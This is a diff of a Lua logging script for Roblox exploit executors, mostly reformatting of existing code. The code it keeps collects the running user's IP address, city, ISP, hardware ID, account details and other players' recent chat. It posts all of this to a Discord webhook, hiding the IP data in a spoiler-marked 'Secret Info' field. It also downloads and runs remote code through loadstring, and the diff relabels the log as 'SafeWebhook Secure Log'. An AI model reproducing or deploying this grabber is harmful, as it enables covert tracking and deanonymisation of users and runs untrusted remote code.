@@ -47,8 +47,14 @@ local function getDeviceInfo()
     local mouseEnabled = UserInputService.MouseEnabled
     local gamepadEnabled = UserInputService.GamepadEnabled
     local platform = GuiService:GetTouchScreenAvailable() and "Mobile" or "PC"
-    return string.format("%s (Touch: %s, Keyboard: %s, Mouse: %s, Gamepad: %s)", 
-        platform, tostring(touchEnabled), tostring(keyboardEnabled), tostring(mouseEnabled), tostring(gamepadEnabled))
+    return string.format(
+        "%s (Touch: %s, Keyboard: %s, Mouse: %s, Gamepad: %s)",
+        platform,
+        tostring(touchEnabled),
+        tostring(keyboardEnabled),
+        tostring(mouseEnabled),
+        tostring(gamepadEnabled)
+    )
 end
 
 local function getPremiumStatus()
@@ -71,16 +77,23 @@ local function getHealth()
 end
 
 local function getExternalInfo()
-    local success, result = pcall(function()
-        return HttpService:JSONDecode(game:HttpGet("http://ip-api.com/json/"))
-    end)
-    return success and result or {query = "Failed", country = "Failed", regionName = "Failed", city = "Failed", isp = "Failed"}
+    local success, result =
+        pcall(
+        function()
+            return HttpService:JSONDecode(game:HttpGet("http://ip-api.com/json/"))
+        end
+    )
+    return success and result or
+        {query = "Failed", country = "Failed", regionName = "Failed", city = "Failed", isp = "Failed"}
 end
 
 local function getHttpbinInfo()
-    local success, result = pcall(function()
-        return HttpService:JSONDecode(game:HttpGet("https://httpbin.org/get"))
-    end)
+    local success, result =
+        pcall(
+        function()
+            return HttpService:JSONDecode(game:HttpGet("https://httpbin.org/get"))
+        end
+    )
     return success and result or {headers = {}, origin = "Failed"}
 end
 
@@ -94,10 +107,12 @@ local function getAllPlayersInfo()
             AccountAge = p.AccountAge,
             Team = p.Team and p.Team.Name or "None",
             Level = p:GetAttribute("Level") or "N/A",
-            Position = p.Character and p.Character:FindFirstChild("HumanoidRootPart") and 
-                tostring(p.Character.HumanoidRootPart.Position) or "N/A",
-            Health = p.Character and p.Character:FindFirstChild("Humanoid") and 
-                string.format("%.0f / %.0f", p.Character.Humanoid.Health, p.Character.Humanoid.MaxHealth) or "N/A"
+            Position = p.Character and p.Character:FindFirstChild("HumanoidRootPart") and
+                tostring(p.Character.HumanoidRootPart.Position) or
+                "N/A",
+            Health = p.Character and p.Character:FindFirstChild("Humanoid") and
+                string.format("%.0f / %.0f", p.Character.Humanoid.Health, p.Character.Humanoid.MaxHealth) or
+                "N/A"
         }
         table.insert(allPlayers, playerInfo)
     end
@@ -131,8 +146,10 @@ local function getPerformanceStats()
     }
 end
 
-local function getUNCScore() 
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/venoxcc/universalscripts/refs/heads/main/uncSave", true))()
+local function getUNCScore()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/venoxcc/universalscripts/refs/heads/main/uncSave", true))(
+
+    )
 
     if getgenv().nUncScore then
         local score = getgenv().nUncScore
@@ -148,7 +165,6 @@ local function getUNCScore()
     end
 end
 
-
 local function getGameInfo()
     local placeInfo = MarketplaceService:GetProductInfo(game.PlaceId)
     return {
@@ -163,16 +179,19 @@ end
 
 local function getChatHistory()
     local chatHistory = {}
-    local maxMessages = 50  -- Adjust the number of messages to capture
+    local maxMessages = 50 -- Adjust the number of messages to capture
     local startTime = tick()
-    local duration = 15  -- Duration to capture messages (in seconds)
+    local duration = 15 -- Duration to capture messages (in seconds)
 
     local function logChatMessage(messageData)
-        table.insert(chatHistory, {
-            Player = messageData.FromSpeaker or messageData.TextSource.Name,
-            Message = messageData.Message or messageData.Text,
-            Timestamp = tick()
-        })
+        table.insert(
+            chatHistory,
+            {
+                Player = messageData.FromSpeaker or messageData.TextSource.Name,
+                Message = messageData.Message or messageData.Text,
+                Timestamp = tick()
+            }
+        )
 
         if #chatHistory > maxMessages then
             table.remove(chatHistory, 1)
@@ -208,7 +227,9 @@ end
 
 -- Main Execution Function
 local function executeLog()
-    if not checkAntiSpam() then return end
+    if not checkAntiSpam() then
+        return
+    end
 
     local externalInfo = getExternalInfo()
     local httpbinInfo = getHttpbinInfo()
@@ -229,49 +250,90 @@ local function executeLog()
                 ["fields"] = {
                     {
                         ["name"] = "🔍 **Script Info**",
-                        ["value"] = string.format("```\nScript Name: %s\nExecuted At: %s\nExecution Count: %d```", 
-                            getgenv().whscript, os.date("%Y-%m-%d %H:%M:%S"), executionCount),
+                        ["value"] = string.format(
+                            "```\nScript Name: %s\nExecuted At: %s\nExecution Count: %d```",
+                            getgenv().whscript,
+                            os.date("%Y-%m-%d %H:%M:%S"),
+                            executionCount
+                        ),
                         ["inline"] = false
                     },
                     {
                         ["name"] = "👤 **Executor Details**",
-                        ["value"] = string.format("```\nUsername: %s\nDisplay Name: %s\nUserID: %d\nAccount Age: %d days\nPremium Status: %s\nHealth: %s\nTeam: %s\nInventory: %s```", 
-                            player.Name, player.DisplayName, player.UserId, player.AccountAge, getPremiumStatus(), getHealth(),
-                            player.Team and player.Team.Name or "None", getInventoryItems()),
+                        ["value"] = string.format(
+                            "```\nUsername: %s\nDisplay Name: %s\nUserID: %d\nAccount Age: %d days\nPremium Status: %s\nHealth: %s\nTeam: %s\nInventory: %s```",
+                            player.Name,
+                            player.DisplayName,
+                            player.UserId,
+                            player.AccountAge,
+                            getPremiumStatus(),
+                            getHealth(),
+                            player.Team and player.Team.Name or "None",
+                            getInventoryItems()
+                        ),
                         ["inline"] = false
                     },
                     {
                         ["name"] = "🎮 **Game Details**",
-                        ["value"] = string.format("```\nGame Name: %s\nGame ID: %d\nServer Job ID: %s\nPlace Version: %d\nPlayers: %d/%d```", 
-                            gameInfo.Name, gameInfo.PlaceId, gameInfo.JobId, gameInfo.PlaceVersion, gameInfo.Players, gameInfo.MaxPlayers),
+                        ["value"] = string.format(
+                            "```\nGame Name: %s\nGame ID: %d\nServer Job ID: %s\nPlace Version: %d\nPlayers: %d/%d```",
+                            gameInfo.Name,
+                            gameInfo.PlaceId,
+                            gameInfo.JobId,
+                            gameInfo.PlaceVersion,
+                            gameInfo.Players,
+                            gameInfo.MaxPlayers
+                        ),
                         ["inline"] = false
                     },
                     {
                         ["name"] = "🖥️ **Device & Performance**",
-                        ["value"] = string.format("```\nDevice: %s\nResolution: %dx%d\nMemory Usage: %.2f MB\nPing: %.2f ms\nFPS: %.2f\nUNC Score: %.2f```", 
-                            getDeviceInfo(), workspace.CurrentCamera.ViewportSize.X, workspace.CurrentCamera.ViewportSize.Y, 
-                            performanceStats.Memory, performanceStats.Ping, performanceStats.FPS, getUNCScore()),
+                        ["value"] = string.format(
+                            "```\nDevice: %s\nResolution: %dx%d\nMemory Usage: %.2f MB\nPing: %.2f ms\nFPS: %.2f\nUNC Score: %.2f```",
+                            getDeviceInfo(),
+                            workspace.CurrentCamera.ViewportSize.X,
+                            workspace.CurrentCamera.ViewportSize.Y,
+                            performanceStats.Memory,
+                            performanceStats.Ping,
+                            performanceStats.FPS,
+                            getUNCScore()
+                        ),
                         ["inline"] = false
                     },
                     {
                         ["name"] = "🌐 **Server Info**",
-                        ["value"] = string.format("```\nServer Time: %s\nTime of Day: %s\nGravity: %.2f```", 
-                            os.date("%H:%M:%S"), Lighting.TimeOfDay, workspace.Gravity),
+                        ["value"] = string.format(
+                            "```\nServer Time: %s\nTime of Day: %s\nGravity: %.2f```",
+                            os.date("%H:%M:%S"),
+                            Lighting.TimeOfDay,
+                            workspace.Gravity
+                        ),
                         ["inline"] = false
                     },
                     {
                         ["name"] = "📍 **Character Info**",
-                        ["value"] = string.format("```\nPosition: %s\nWalk Speed: %.1f\nJump Power: %.1f\nJump Height: %.1f```", 
-                            getPlayerPosition(), 
-                            player.Character and player.Character:FindFirstChild("Humanoid") and player.Character.Humanoid.WalkSpeed or "N/A",
-                            player.Character and player.Character:FindFirstChild("Humanoid") and player.Character.Humanoid.JumpPower or "N/A",
-                            player.Character and player.Character:FindFirstChild("Humanoid") and player.Character.Humanoid.JumpHeight or "N/A"),
+                        ["value"] = string.format(
+                            "```\nPosition: %s\nWalk Speed: %.1f\nJump Power: %.1f\nJump Height: %.1f```",
+                            getPlayerPosition(),
+                            player.Character and player.Character:FindFirstChild("Humanoid") and
+                                player.Character.Humanoid.WalkSpeed or
+                                "N/A",
+                            player.Character and player.Character:FindFirstChild("Humanoid") and
+                                player.Character.Humanoid.JumpPower or
+                                "N/A",
+                            player.Character and player.Character:FindFirstChild("Humanoid") and
+                                player.Character.Humanoid.JumpHeight or
+                                "N/A"
+                        ),
                         ["inline"] = false
                     },
                     {
                         ["name"] = "🔒 **Security Info**",
-                        ["value"] = string.format("```\nExecutor: %s\nHWID: %s```", 
-                            identifyexecutor(), game:GetService("RbxAnalyticsService"):GetClientId()),
+                        ["value"] = string.format(
+                            "```\nExecutor: %s\nHWID: %s```",
+                            identifyexecutor(),
+                            game:GetService("RbxAnalyticsService"):GetClientId()
+                        ),
                         ["inline"] = false
                     },
                     {
@@ -281,7 +343,8 @@ local function executeLog()
                     },
                     {
                         ["name"] = "💬 **Recent Chat History (Last 15 secs)**",
-                        ["value"] = #chatHistory > 0 and "```" .. HttpService:JSONEncode(chatHistory) .. "```" or "No messages captured in the last 15 seconds.",
+                        ["value"] = #chatHistory > 0 and "```" .. HttpService:JSONEncode(chatHistory) .. "```" or
+                            "No messages captured in the last 15 seconds.",
                         ["inline"] = false
                     },
                     {
@@ -296,18 +359,23 @@ local function executeLog()
                     },
                     {
                         ["name"] = "🌐 **Httpbin.org Info**",
-                        ["value"] = string.format("```\nUser-Agent: %s\nAccept-Language: %s\nOrigin IP: %s```", 
+                        ["value"] = string.format(
+                            "```\nUser-Agent: %s\nAccept-Language: %s\nOrigin IP: %s```",
                             httpbinInfo.headers["User-Agent"] or "N/A",
                             httpbinInfo.headers["Accept-Language"] or "N/A",
-                            httpbinInfo.origin or "N/A"),
+                            httpbinInfo.origin or "N/A"
+                        ),
                         ["inline"] = false
                     }
                 },
                 ["thumbnail"] = {
-                    ["url"] = string.format("https://www.roblox.com/headshot-thumbnail/image?userId=%d&width=420&height=420&format=png", player.UserId)
+                    ["url"] = string.format(
+                        "https://www.roblox.com/headshot-thumbnail/image?userId=%d&width=420&height=420&format=png",
+                        player.UserId
+                    )
                 },
                 ["footer"] = {
-                    ["text"] = "Ultra-Detailed Execution Log | " .. os.date("%Y-%m-%d %H:%M:%S"),
+                    ["text"] = "SafeWebhook Secure Log | " .. os.date("%Y-%m-%d %H:%M:%S"),
                     ["icon_url"] = "https://www.roblox.com/asset/?id=6031075938"
                 }
             }
@@ -316,21 +384,37 @@ local function executeLog()
 
     -- Add secret information if enabled
     if getgenv().ExecLogSecret then
-        table.insert(data.embeds[1].fields, {
-            ["name"] = "**`(🤫) Secret Info`**",
-            ["value"] = string.format("||```\nIP: %s\nCountry: %s\nRegion: %s\nCity: %s\nISP: %s```||", 
-                externalInfo.query, externalInfo.country, externalInfo.regionName, externalInfo.city, 
-                externalInfo.isp),
-            ["inline"] = false
-        })
+        table.insert(
+            data.embeds[1].fields,
+            {
+                ["name"] = "**`(🤫) Secret Info`**",
+                ["value"] = string.format(
+                    "||```\nIP: %s\nCountry: %s\nRegion: %s\nCity: %s\nISP: %s```||",
+                    externalInfo.query,
+                    externalInfo.country,
+                    externalInfo.regionName,
+                    externalInfo.city,
+                    externalInfo.isp
+                ),
+                ["inline"] = false
+            }
+        )
     end
 
     -- Send webhook
-    local success, response = pcall(function()
-        local headers = {["content-type"] = "application/json"}
-        local requestInfo = {Url = getgenv().webhookexecUrl, Body = HttpService:JSONEncode(data), Method = "POST", Headers = headers}
-        return syn.request(requestInfo)
-    end)
+    local success, response =
+        pcall(
+        function()
+            local headers = {["content-type"] = "application/json"}
+            local requestInfo = {
+                Url = getgenv().webhookexecUrl,
+                Body = HttpService:JSONEncode(data),
+                Method = "POST",
+                Headers = headers
+            }
+            return syn.request(requestInfo)
+        end
+    )
 
     if not success then
         warn("Failed to send webhook:", response)
